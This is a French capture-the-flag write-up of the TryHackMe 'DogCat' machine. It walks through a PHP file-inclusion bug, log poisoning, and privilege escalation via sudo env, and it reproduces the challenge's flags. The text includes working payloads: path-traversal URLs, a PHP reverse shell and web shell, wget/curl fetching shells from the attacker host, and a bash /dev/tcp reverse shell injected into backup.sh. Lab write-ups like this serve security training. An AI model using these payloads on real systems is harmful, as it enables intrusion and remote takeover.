# DogCat

10.10.223.59

## Recon

```sh
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
```

PHP et LFI, on va faire du [Fuzzing](https://fr.wikipedia.org/wiki/Fuzzing) sur les paramètres GET.

http://10.10.134.184/?view=cat
http://10.10.134.184/?view=dog


**Test#1**: view-source:http://10.10.134.184/?view=../../../etc/passwd

Si on met autre chose de `cat` ou `dog`, la page indique "Only Dogs or Cats are allowed".

**Test#2**: view-source:http://10.10.134.184/?view=/cat/../../../etc/passwd

```php
Warning: include(/cat/../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24
Warning: include(): Failed opening '../cat/../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

On remarque que l'inclusion fonctionne, le code php doit vérifier que la chaine `cat` ou `dog` est prente dans la valeur du paramètre.

On remarque également que l'extension `.php` est ajoutée ... `../cat/../../../etc/passwd.php`

On ne peut donc inclure que des fichiers `.php`

**Test#3**: view-source:http://10.10.134.184/?view=cat/../index

Inclusion en double, donc ça marche, mais on peux pas afficher le code source de index.php car il est automatiquement interprété par le moteur CGI...

un petit tour sur PayloadAllTheTings : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi--rfi-using-wrappers

**Test#4**: view-source:http://10.10.134.184/?view=php://filter/convert.base64-encode/resource=cat/../index

```sh
echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" | base64 --decode
```

```html
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

On découvre qu'un autre paramètre est pris en charge : `$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';`

**Test#5**: view-source:http://10.10.134.184/?view=/cat/../../../etc/passwd&ext=

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
``` 

Maintenant on sait qu'on peut inclure un fichier local ... déja existant sur la machine mais on a rien d'intéressant ...

### LFI to RCE : Log Poisoning

https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1

> Log Poisoning is a common technique used to gain a reverse shell from a LFI vulnerability. To make it work an attacker attempts to inject malicious input to the server log.
>
> As the PHP statement “include” also evaluates the input, an inclusion of a malformed file would be evaluated too. If we control the contents of a file available on the vulnerable web application, we could insert PHP code and load the file over the LFI vulnerability to execute our code.
>
> Back in the day, mostly, such injections were taking place over the server log files. Such files are the Apache error log, the Access log and more. Techniques like these have been used for years and, hopefully, they won’t work on updated systems - even if they are LFI vulnerable.
>
>To make it even clearer, let’s see some examples. On the following screencaps, an invalid request is sent to the vulnerable application. Notice that the request is invalid, requesting the page “/<?php phpinfo(); ?>”Then, we include the file from the LFI vulnerability.

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-controlled-log-file

> BurpSuite

```php
<?php $sock=fsockopen('10.9.11.84',4242); exec('/bin/sh -i <&3 >&3 2>&3'); ?>
```

```
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
```

```php
<?php file_put_contents('shell.php', fopen('http://10.9.11.184/shell.php', 'r')); ?>
```

```
wget http://10.10.64.24/shell.php
```


```php
<?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>
```

https://stackoverflow.com/questions/3938534/download-file-to-server-from-url

```sh
$ cat flag.php
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```

## Upgrade shell 

Python pas installé... essai de socat 

```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat; 
```

```
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.9.11.184:4444
```

=> OK

```
curl http://10.9.11.184/socat -o socat
```

```
export SHELL=bash
export TERM=xterm256-color
stty rows 26 columns 157
```

```sh
www-data@4f44d9c24808:/tmp$ cat /var/www/html/flag.php 
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```

## Escalade

```
curl http://10.9.28.128/linpeas.sh -o linpeas.sh
```

```sh
find / -perm -4000 2>/dev/null
```

```sh
www-data@4f44d9c24808:/tmp$ sudo -l
Matching Defaults entries for www-data on 4f44d9c24808:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 4f44d9c24808:
    (root) NOPASSWD: /usr/bin/env
```


https://gtfobins.github.io/gtfobins/env/#suid

```
sudo sh -c 'cp $(which env) .; chmod +s ./env'
```

```
sudo /usr/bin/env /bin/sh -p
```

```sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root	
# ls
flag3.txt
# cat flag3.txt
THM{D1ff3r3nt_3nv1ronments_874112}
```

```
# cat /var/www/flag2_QMW7JvaY2LvK.txt
```


Recherche strings dans les fichiers jpg ... NOK

```
for i in *; do strings $i | grep { ; done
```
```
echo '#!/bin/bash' > backup.sh && echo 'bash -i >& /dev/tcp/10.9.11.184/9999 0>&1' >> backup.sh
```

```
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```